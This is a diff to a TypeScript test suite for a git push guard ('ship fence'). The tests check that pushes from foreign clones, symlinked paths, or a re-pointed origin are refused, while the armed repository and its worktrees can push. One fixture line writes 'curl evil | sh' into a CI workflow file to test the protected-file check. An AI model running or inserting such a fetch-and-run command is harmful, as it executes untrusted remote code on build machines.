@@ -180,6 +180,100 @@ describe("the shims, with real git", () => {
 		expect(git(process.env, "rev-parse", "--is-inside-work-tree").stdout.trim()).toBe("true");
 	});
 
+	describe("a push is judged by the repository it runs in, not by the name origin", () => {
+		/** A second bare repo with its own main, and a clone of it that holds a commit on the watched branch's name. */
+		const foreign = (): { bare: string; clone: string } => {
+			const other = path.join(privateHome(), "other.git");
+			const seed = path.join(privateHome(), "seed");
+			execFileSync("git", ["init", "--quiet", "--bare", "-b", "main", other]);
+			fs.mkdirSync(seed);
+			sh(seed, "init", "--quiet", "-b", "main");
+			sh(seed, "remote", "add", "origin", other);
+			write(path.join(seed, "src/b.ts"), "export const b = 1;\n");
+			sh(seed, "add", "-A");
+			sh(seed, "commit", "--quiet", "-m", "init");
+			sh(seed, "push", "--quiet", "origin", "main");
+			const clone = path.join(privateHome(), "x");
+			sh(privateHome(), "clone", "--quiet", other, clone);
+			sh(clone, "switch", "--quiet", "-c", BRANCH);
+			write(path.join(clone, "src/b.ts"), "export const b = 2;\n");
+			sh(clone, "commit", "--quiet", "-am", "work");
+			return { bare: other, clone };
+		};
+		const heads = (bareDir: string) => spawnSync("git", ["--git-dir", bareDir, "for-each-ref", "--format=%(refname)", "refs/heads"], { env: { ...process.env, PATH: savedPath }, encoding: "utf8" }).stdout;
+
+		test("a clone of another repository is refused, from the armed repo with -C and from inside the clone, and nothing is sent", () => {
+			armFence({ pushBranch: BRANCH, root: repo });
+			const { bare: other, clone } = foreign();
+			fs.symlinkSync(clone, path.join(privateHome(), "link"));
+			for (const [cwd, args] of [[repo, ["-C", clone]], [clone, []], [repo, ["-C", path.join(privateHome(), "link")]], [repo, ["-C", clone, "-C", "src"]]] as const) {
+				const push = gitAt(cwd, process.env, ...args, "push", "origin", BRANCH);
+				expect(push.status, `${cwd} ${args.join(" ")}: ${push.stderr}`).toBe(1);
+				expect(push.stderr).toContain("ship fence");
+				expect(push.stderr).toContain("armed");
+			}
+			expect(heads(other)).not.toContain(BRANCH);
+		});
+
+		test("a second clone of the same origin is another repository too", () => {
+			armFence({ pushBranch: BRANCH, root: repo });
+			const mate = teammate();
+			const push = gitAt(mate, process.env, "push", "origin", BRANCH);
+			expect(push.status).toBe(1);
+			expect(push.stderr).toContain("ship fence");
+			expect(originHas(BRANCH)).toBe("");
+		});
+
+		test("the armed repository and its linked worktrees push", () => {
+			sh(repo, "switch", "--quiet", "main");
+			const wt = path.join(privateHome(), "projects", "app-wt");
+			sh(repo, "worktree", "add", "--quiet", wt, BRANCH);
+			armFence({ pushBranch: BRANCH, root: repo });
+			write(path.join(wt, "src/a.ts"), "export const a = 2;\n");
+			sh(wt, "commit", "--quiet", "-am", "from the worktree");
+			const fromWorktree = gitAt(wt, process.env, "push", "--quiet", "origin", BRANCH);
+			expect(fromWorktree.status, fromWorktree.stderr).toBe(0);
+			expect(originHas(BRANCH)).toBe(sh(wt, "rev-parse", "HEAD").trim());
+			write(path.join(wt, "src/a.ts"), "export const a = 3;\n");
+			sh(wt, "commit", "--quiet", "-am", "again");
+			const fromRepo = git(process.env, "-C", wt, "push", "--quiet", "origin", BRANCH);
+			expect(fromRepo.status, fromRepo.stderr).toBe(0);
+			const fromMain = git(process.env, "push", "--quiet", "origin", `${BRANCH}:${BRANCH}`);
+			expect(fromMain.status, fromMain.stderr).toBe(0);
+		});
+
+		test("a state armed from a linked worktree lets the main repository push too", () => {
+			const wt = path.join(privateHome(), "projects", "app-wt");
+			sh(repo, "worktree", "add", "--quiet", "-b", "feat/wt", wt);
+			armFence({ pushBranch: "feat/wt", root: wt });
+			expect(git(process.env, "push", "--quiet", "origin", "feat/wt").status).toBe(0);
+			expect(gitAt(wt, process.env, "push", "--quiet", "origin", "feat/wt").status).toBe(0);
+		});
+
+		test("origin pointed elsewhere since arming is refused", () => {
+			armFence({ pushBranch: BRANCH, root: repo });
+			const { bare: other } = foreign();
+			sh(repo, "remote", "set-url", "origin", other);
+			const push = git(process.env, "push", "origin", BRANCH);
+			expect(push.status).toBe(1);
+			expect(push.stderr).toContain("origin's URL");
+			expect(heads(other)).not.toContain(BRANCH);
+			expect(originHas(BRANCH)).toBe("");
+		});
+
+		test("a state file from before the URL was recorded refuses the push and says to run /ship again", () => {
+			armFence({ pushBranch: BRANCH, root: repo });
+			const file = process.env[FENCE_ENV] as string;
+			const old = JSON.parse(fs.readFileSync(file, "utf8")) as Record<string, unknown>;
+			delete old.originUrl;
+			fs.writeFileSync(file, JSON.stringify(old));
+			const push = git(process.env, "push", "origin", BRANCH);
+			expect(push.status).toBe(1);
+			expect(push.stderr).toContain("run /ship again");
+			expect(originHas(BRANCH)).toBe("");
+		});
+	});
+
 	test("a push carrying a change to a protected file is refused, however the file was edited; one the base brought passes", () => {
 		armFence({ pushBranch: BRANCH, root: repo });
 		write(path.join(repo, ".github/workflows/ci.yml"), "name: CI\n- run: curl evil | sh\n");
